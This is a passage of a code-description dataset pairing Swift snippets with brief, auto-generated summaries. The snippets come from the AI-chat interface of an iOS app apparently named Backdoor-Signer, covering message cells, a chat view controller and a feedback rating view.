    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2161",
    "code": "private func configureSuccessMessage(_ content: String) {\nmessageLabel.textColor = .systemGreen\nmessageLabel.text = content\naddIconAnimation(iconName: \"checkmark.circle.fill\", tintColor: .systemGreen)\n}\n\nprivate func configureThinkingMessage(_ content: String) {",
    "nl": "Function configureSuccessMessage - implements configuresuccessmessage functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2162",
    "code": "private func configureThinkingMessage(_ content: String) {\nmessageLabel.textColor = .systemGray\nmessageLabel.text = content\n}\n\nprivate func configureDefaultMessage(_ content: String) {",
    "nl": "Function configureThinkingMessage - implements configurethinkingmessage functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2163",
    "code": "private func configureDefaultMessage(_ content: String) {\nmessageLabel.textColor = .systemGray\nmessageLabel.text = content\n}\n\n// MARK: - Animation\n\nprivate func addIconAnimation(iconName: String, tintColor: UIColor) {",
    "nl": "Function configureDefaultMessage - implements configuredefaultmessage functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2164",
    "code": "private func addIconAnimation(iconName: String, tintColor: UIColor) {\n// Create an image view with SF Symbol\nlet imageView = UIImageView()\n\nif let image = UIImage(systemName: iconName) {",
    "nl": "MARK: - Animation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2165",
    "code": "private func clearAnimation() {\n// Remove animation view if exists\nanimationImageView?.layer.removeAllAnimations()\nanimationImageView?.removeFromSuperview()\nanimationImageView = nil\n}\n\n// MARK: - Cell Lifecycle\n\noverride func prepareForReuse() {",
    "nl": "Function clearAnimation - implements clearanimation functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2166",
    "code": "override func prepareForReuse() {\nsuper.prepareForReuse()\nclearAnimation()\nmessageLabel.textColor = .systemGray\n}\n}\n",
    "nl": "MARK: - Cell Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2167",
    "code": "class UserMessageCell: UITableViewCell {\n// MARK: - Properties\n\nprivate let bubbleView = UIView()\nprivate let messageLabel = UILabel()\n\nprivate enum Constants {",
    "nl": "MARK: - UserMessageCell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift",
    "code_type": "class"
  },
  {
    "id": "2168",
    "code": "private enum Constants {\nstatic let cornerRadius: CGFloat = 16\nstatic let fontSize: CGFloat = 16\n\nstatic let bubblePadding: CGFloat = 12\nstatic let bubbleTopBottomPadding: CGFloat = 6\nstatic let bubbleMaxWidth: CGFloat = 280\n\nstatic let messagePadding: CGFloat = 12\nstatic let messageTopBottomPadding: CGFloat = 8",
    "nl": "enum Constants - implements functionality related to constants",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift",
    "code_type": "enum"
  },
  {
    "id": "2169",
    "code": "private func configureViews() {\nconfigureCellAppearance()\nconfigureBubbleView()\nconfigureMessageLabel()\nsetupConstraints()\n}\n\nprivate func configureCellAppearance() {",
    "nl": "MARK: - View Configuration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2170",
    "code": "private func configureCellAppearance() {\nselectionStyle = .none\nbackgroundColor = .clear\n}\n\nprivate func configureBubbleView() {",
    "nl": "Function configureCellAppearance - implements configurecellappearance functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2171",
    "code": "private func configureBubbleView() {\n// Configure bubble shape\nbubbleView.layer.cornerRadius = Constants.cornerRadius\nbubbleView.layer.maskedCorners = [\n.layerMinXMinYCorner,\n.layerMinXMaxYCorner,\n.layerMaxXMinYCorner,\n]\n\n// Add gradient background",
    "nl": "Function configureBubbleView - implements configurebubbleview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2172",
    "code": "private func configureBubbleShadow() {\nbubbleView.layer.shadowColor = UIColor.black.withAlphaComponent(Constants.shadowAlpha).cgColor\nbubbleView.layer.shadowOffset = Constants.shadowOffset\nbubbleView.layer.shadowRadius = Constants.shadowRadius\nbubbleView.layer.shadowOpacity = Constants.shadowOpacity\nbubbleView.layer.masksToBounds = false\n}\n\nprivate func configureMessageLabel() {",
    "nl": "Function configureBubbleShadow - implements configurebubbleshadow functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2173",
    "code": "private func configureMessageLabel() {\nmessageLabel.numberOfLines = 0\nmessageLabel.textColor = .white\nmessageLabel.font = .systemFont(ofSize: Constants.fontSize)\n\nmessageLabel.translatesAutoresizingMaskIntoConstraints = false\nbubbleView.addSubview(messageLabel)\n}\n\nprivate func setupConstraints() {",
    "nl": "Function configureMessageLabel - implements configuremessagelabel functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2174",
    "code": "private func setupConstraints() {\nNSLayoutConstraint.activate([\n// Bubble view constraints\nbubbleView.trailingAnchor.constraint(\nequalTo: contentView.trailingAnchor,\nconstant: -Constants.bubblePadding\n),\nbubbleView.topAnchor.constraint(\nequalTo: contentView.topAnchor,\nconstant: Constants.bubbleTopBottomPadding",
    "nl": "Function setupConstraints - sets upconstraints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2175",
    "code": "private func addGradientToBubble() {\nlet gradientLayer = CAGradientLayer()\n\n// Configure gradient colors and direction\ngradientLayer.colors = [\nUIColor.systemBlue.cgColor,\nUIColor(red: 0.1, green: 0.6, blue: 1.0, alpha: 1.0).cgColor,\n]\ngradientLayer.startPoint = CGPoint(x: 0, y: 0)\ngradientLayer.endPoint = CGPoint(x: 1, y: 1)",
    "nl": "MARK: - Gradient Configuration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2176",
    "code": "override func layoutSubviews() {\nsuper.layoutSubviews()\n\n// Update gradient frame when layout changes\nif let gradientLayer = bubbleView.layer.sublayers?.first as? CAGradientLayer {",
    "nl": "MARK: - Layout",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2177",
    "code": "func configure(with message: ChatMessage) {\nmessageLabel.text = message.content\n}\n}\n",
    "nl": "MARK: - Configuration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2178",
    "code": "class ChatViewController: UIViewController, UITableViewDataSource, UITableViewDelegate,\nUISheetPresentationControllerDelegate\n{",
    "nl": "class ChatViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "class"
  },
  {
    "id": "2179",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupUI()\nloadMessages()\n\n// Register for app background/foreground notifications\nsetupAppStateObservers()\n\n// Add a welcome message if this is a new session\nif messages.isEmpty {",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2180",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\n\n// Set navigation bar appearance\nif let navigationController = navigationController {",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2181",
    "code": "override func viewDidDisappear(_ animated: Bool) {\nsuper.viewDidDisappear(animated)\n\n// If we're being dismissed (not just covered by another VC), call the dismissHandler\nif isBeingDismissed || navigationController?.isBeingDismissed == true {",
    "nl": "Function viewDidDisappear - implements viewdiddisappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2182",
    "code": "private func addWelcomeMessage() {\ndo {",
    "nl": "MARK: - Welcome Message",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2183",
    "code": "private func setupAppStateObservers() {\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(appDidEnterBackground),\nname: UIApplication.didEnterBackgroundNotification,\nobject: nil\n)\n\nNotificationCenter.default.addObserver(\nself,",
    "nl": "MARK: - App State Handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2184",
    "code": "@objc private func appDidEnterBackground() {\n// Save any pending state when app goes to background\nDebug.shared.log(message: \"Chat view controller saving state before background\", type: .debug)\n\n// Cancel any ongoing message processing\nif isProcessingMessage {",
    "nl": "Function appDidEnterBackground - implements appdidenterbackground functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2185",
    "code": "@objc private func appWillEnterForeground() {\n// Refresh data when app comes to foreground\nDebug.shared.log(message: \"Chat view controller becoming active after background\", type: .debug)\n\n// Refresh messages to ensure we're in sync with CoreData\nDispatchQueue.main.async(execute: { [weak self] in",
    "nl": "Function appWillEnterForeground - implements appwillenterforeground functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2186",
    "code": "private func setupUI() {\nview.backgroundColor = .systemBackground\n\n// Navigation bar\nnavigationItem.title = currentSession.title\nnavigationItem.leftBarButtonItem = UIBarButtonItem(\nimage: UIImage(systemName: \"clock.arrow.circlepath\"),\nstyle: .plain,\ntarget: self,\naction: #selector(showHistory)",
    "nl": "MARK: - UI Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2187",
    "code": "private func setupTableView() {\ntableView.dataSource = self\ntableView.delegate = self\n\n// Register cell types\ntableView.register(UserMessageCell.self, forCellReuseIdentifier: \"UserCell\")\ntableView.register(AIMessageCell.self, forCellReuseIdentifier: \"AICell\")\ntableView.register(SystemMessageCell.self, forCellReuseIdentifier: \"SystemCell\")\n\n// Configure tableView appearance",
    "nl": "Function setupTableView - sets uptableview",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2188",
    "code": "private func setupEmptyStateView() {\n// Create an empty state view\nlet emptyView = UIView()\nemptyView.isHidden = true\nemptyView.backgroundColor = .clear\n\n// Add animation for empty state using SF Symbol\nlet animationView = emptyView.addAnimatedIcon(\nsystemName: \"ellipsis.bubble\",\ntintColor: .systemBlue,",
    "nl": "Function setupEmptyStateView - sets upemptystateview",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2189",
    "code": "@objc private func refreshMessages() {\n// Reload messages from database\nloadMessages()\n\n// End refreshing\ntableView.refreshControl?.endRefreshing()\n}\n\n// Update UI when message processing state changes\nprivate func updateProcessingState(isProcessing: Bool) {",
    "nl": "Function refreshMessages - implements refreshmessages functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2190",
    "code": "private func updateProcessingState(isProcessing: Bool) {\nif isProcessing {",
    "nl": "Update UI when message processing state changes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2191",
    "code": "private func setupInputControls() {\n// Input container with enhanced styling\ninputContainer.backgroundColor = .systemBackground\ninputContainer.applyCardStyling(\ncornerRadius: 12,\nshadowOpacity: 0.15,\nbackgroundColor: .systemBackground\n)\nview.addSubview(inputContainer)\n",
    "nl": "Function setupInputControls - sets upinputcontrols",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2192",
    "code": "private func setupConstraints() {\n// Enable autolayout\ntableView.translatesAutoresizingMaskIntoConstraints = false\ninputContainer.translatesAutoresizingMaskIntoConstraints = false\ntextField.translatesAutoresizingMaskIntoConstraints = false\nsendButton.translatesAutoresizingMaskIntoConstraints = false\nactivityIndicator.translatesAutoresizingMaskIntoConstraints = false\n\n// Safe area guide for proper layout\nlet safeArea = view.safeAreaLayoutGuide",
    "nl": "Function setupConstraints - sets upconstraints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2193",
    "code": "private func setupKeyboardHandling() {\n// Add keyboard notifications\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(keyboardWillShow),\nname: UIResponder.keyboardWillShowNotification,\nobject: nil\n)\n\nNotificationCenter.default.addObserver(",
    "nl": "Function setupKeyboardHandling - sets upkeyboardhandling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2194",
    "code": "@objc private func dismissKeyboard() {\nview.endEditing(true)\n}\n\n@objc private func keyboardWillShow(notification: NSNotification) {",
    "nl": "Function dismissKeyboard - implements dismisskeyboard functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2195",
    "code": "@objc private func keyboardWillShow(notification: NSNotification) {\nguard let keyboardFrame = notification.userInfo?[UIResponder.keyboardFrameEndUserInfoKey] as? CGRect,\nlet duration = notification.userInfo?[UIResponder.keyboardAnimationDurationUserInfoKey] as? Double\nelse {",
    "nl": "Function keyboardWillShow - implements keyboardwillshow functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2196",
    "code": "@objc private func keyboardWillHide(notification: NSNotification) {\nguard let duration = notification.userInfo?[UIResponder.keyboardAnimationDurationUserInfoKey] as? Double else {",
    "nl": "Function keyboardWillHide - implements keyboardwillhide functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2197",
    "code": "private func loadMessages() {\n// Fetch messages from CoreData\nlet fetchedMessages = CoreDataManager.shared.getMessages(for: currentSession)\n\n// Handle the case where no messages are found\nif fetchedMessages.isEmpty && messages.isEmpty {",
    "nl": "MARK: - Data Loading",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2198",
    "code": "private func scrollToBottom(animated: Bool = true) {\n// Ensure we have messages and the table view is loaded\nif !messages.isEmpty && tableView.window != nil {",
    "nl": "Function scrollToBottom - implements scrolltobottom functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2199",
    "code": "@objc private func showHistory() {\nlet historyVC = ChatHistoryViewController()\nhistoryVC.didSelectSession = { [weak self] session in",
    "nl": "MARK: - Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2200",
    "code": "@objc private func newChat() {\n// If already processing a message, don't allow creating a new chat\nif isProcessingMessage {",
    "nl": "Function newChat - implements newchat functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2201",
    "code": "func loadSession(_ session: ChatSession) {\nif isProcessingMessage {",
    "nl": "/ Load a different chat session",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2202",
    "code": "@objc private func sendMessage() {\n// Ensure we're not already processing a message\nif isProcessingMessage {",
    "nl": "Function sendMessage - implements sendmessage functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2203",
    "code": "private func handleMessageProcessingTimeout() {\nDispatchQueue.main.async(execute: { [weak self] in",
    "nl": "/ Handle timeout of message processing (e.g., when app is backgrounded for too long)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2204",
    "code": "private func processCommands(from response: String) {\n// Extract commands using regex\nlet commands = extractCommands(from: response)\n\n// Process each command\nfor (command, parameter) in commands {",
    "nl": "MARK: - Command Processing / Process commands extracted from AI response",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2205",
    "code": "private func extractCommands(from text: String) -> [(command: String, parameter: String)] {\nlet pattern = \"\\\\[([^:]+):([^\\\\]]+)\\\\]\"\ndo {",
    "nl": "Extract commands from AI response text",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2206",
    "code": "private func showErrorAlert(message: String) {\nlet alert = UIAlertController(\ntitle: \"Error\",\nmessage: message,\npreferredStyle: .alert\n)\nalert.addAction(UIAlertAction(title: \"OK\", style: .default))\n\n// Check if we can present the alert\nif !isBeingDismissed && !isBeingPresented && presentedViewController == nil {",
    "nl": "MARK: - Error Handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2207",
    "code": "func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {\nreturn messages.count\n}\n\nfunc tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {",
    "nl": "MARK: - UITableViewDataSource",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2208",
    "code": "func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nguard indexPath.row < messages.count else {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2209",
    "code": "func presentationControllerDidDismiss(_: UIPresentationController) {\ndismissHandler?()\n}\n}\n\n// MARK: - UITextFieldDelegate\n\nextension ChatViewController: UITextFieldDelegate {",
    "nl": "MARK: - UISheetPresentationControllerDelegate Handle sheet dismissal properly",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2210",
    "code": "extension ChatViewController: UITextFieldDelegate {\nfunc textFieldShouldReturn(_: UITextField) -> Bool {",
    "nl": "MARK: - UITextFieldDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "extension"
  },
  {
    "id": "2211",
    "code": "func textFieldShouldReturn(_: UITextField) -> Bool {\nsendMessage()\nreturn true\n}\n} Assistant/ChatViewController.swift\n",
    "nl": "Function textFieldShouldReturn - implements textfieldshouldreturn functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift",
    "code_type": "function"
  },
  {
    "id": "2212",
    "code": "class AIFeedbackView: UIView {\n// MARK: - Properties\n\n// Callback for when feedback is submitted\nvar onFeedbackSubmitted: ((Int, String?) -> Void)?\n\n// UI Components\nprivate let titleLabel = UILabel()\nprivate let ratingControl = RatingControl()\nprivate let commentTextView = UITextView()",
    "nl": "/ View for collecting feedback on AI responses",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift",
    "code_type": "class"
  },
  {
    "id": "2213",
    "code": "private func setupView() {\nbackgroundColor = .systemBackground\nlayer.cornerRadius = 12\nlayer.shadowColor = UIColor.black.cgColor\nlayer.shadowOpacity = 0.1\nlayer.shadowOffset = CGSize(width: 0, height: 2)\nlayer.shadowRadius = 4\n\n// Configure title label\ntitleLabel.text = \"How helpful was this response?\"",
    "nl": "MARK: - Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift",
    "code_type": "function"
  },
  {
    "id": "2214",
    "code": "@objc private func submitFeedback() {\n// Get the feedback values\nlet rating = ratingControl.rating\n\n// Only consider comments if they're not the placeholder\nlet comment: String? = commentTextView.textColor == .placeholderText ? nil : commentTextView.text\n\n// Call the feedback handler\nonFeedbackSubmitted?(rating, comment)\n",
    "nl": "MARK: - Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift",
    "code_type": "function"
  },
  {
    "id": "2215",
    "code": "@objc private func skipFeedback() {\n// Reset and hide without submitting\nresetFeedbackControl()\n\n// Hide with animation\nUIView.animate(withDuration: 0.3, animations: {",
    "nl": "Function skipFeedback - implements skipfeedback functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift",
    "code_type": "function"
  },
  {
    "id": "2216",
    "code": "private func resetFeedbackControl() {\nratingControl.rating = 0\ncommentTextView.text = \"Additional comments (optional)\"\ncommentTextView.textColor = .placeholderText\n}\n}\n\n// MARK: - UITextView Delegate\n\nextension AIFeedbackView: UITextViewDelegate {",
    "nl": "/ Reset feedback controls to initial state",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift",
    "code_type": "function"
  },
  {
    "id": "2217",
    "code": "extension AIFeedbackView: UITextViewDelegate {\nfunc textViewDidBeginEditing(_ textView: UITextView) {",
    "nl": "MARK: - UITextView Delegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift",
    "code_type": "extension"
  },
  {
    "id": "2218",
    "code": "func textViewDidBeginEditing(_ textView: UITextView) {\nif textView.textColor == .placeholderText {",
    "nl": "Function textViewDidBeginEditing - implements textviewdidbeginediting functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift",
    "code_type": "function"
  },
  {
    "id": "2219",
    "code": "func textViewDidEndEditing(_ textView: UITextView) {\nif textView.text.isEmpty {",
    "nl": "Function textViewDidEndEditing - implements textviewdidendediting functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift",
    "code_type": "function"
  },
  {
    "id": "2220",
    "code": "class RatingControl: UIView {\n// MARK: - Properties\n\n/// Number of stars to display\nvar starCount: Int = 5 {",
    "nl": "MARK: - Rating Control",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift",
    "code_type": "class"
  },
  {
    "id": "2221",
    "code": "private func setupStars() {\n// Remove existing star buttons\nfor button in starButtons {",
    "nl": "MARK: - Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift",
    "code_type": "function"
  },
  {
    "id": "2222",
    "code": "private func updateLayout() {\n// Position the buttons horizontally with equal spacing\nlet totalStarWidth = CGFloat(starCount) * starSize\nlet spacing = (bounds.width - totalStarWidth) / CGFloat(starCount + 1)\n\nfor (index, button) in starButtons.enumerated() {",
    "nl": "Function updateLayout - updates layout",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift",
    "code_type": "function"
  },
  {
    "id": "2223",
    "code": "override func layoutSubviews() {\nsuper.layoutSubviews()\nupdateLayout()\n}\n\n// MARK: - Button Action\n\n@objc private func starButtonTapped(_ sender: UIButton) {",
    "nl": "Function layoutSubviews - implements layoutsubviews functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift",
    "code_type": "function"
  },
  {
    "id": "2224",
    "code": "@objc private func starButtonTapped(_ sender: UIButton) {\nguard let index = starButtons.firstIndex(of: sender) else {",
    "nl": "MARK: - Button Action",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift",
    "code_type": "function"
  },
  {
    "id": "2225",
    "code": "private func updateStarDisplay() {\nfor (index, button) in starButtons.enumerated() {",
    "nl": "MARK: - Update UI",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIFeedbackView.swift",
    "code_type": "function"
  },
  {
    "id": "2226",
    "code": "class AIViewController: UIViewController {\n\n// MARK: - UI Components\n\nprivate let welcomeLabel = UILabel()\nprivate let startChatButton = UIButton(type: .system)\nprivate let recentChatsTableView = UITableView(frame: .zero, style: .insetGrouped)\nprivate let emptyStateView = UIView()\n\n// MARK: - Data",
    "nl": "/ View controller for the AI Assistant tab",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2227",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\nsetupUI()\nconfigureNavigationBar()\nsetupTableView()\nsetupEmptyState()\n\n// Log initialization\nDebug.shared.log(message: \"AIViewController initialized\", type: .info)",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AIViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2228",
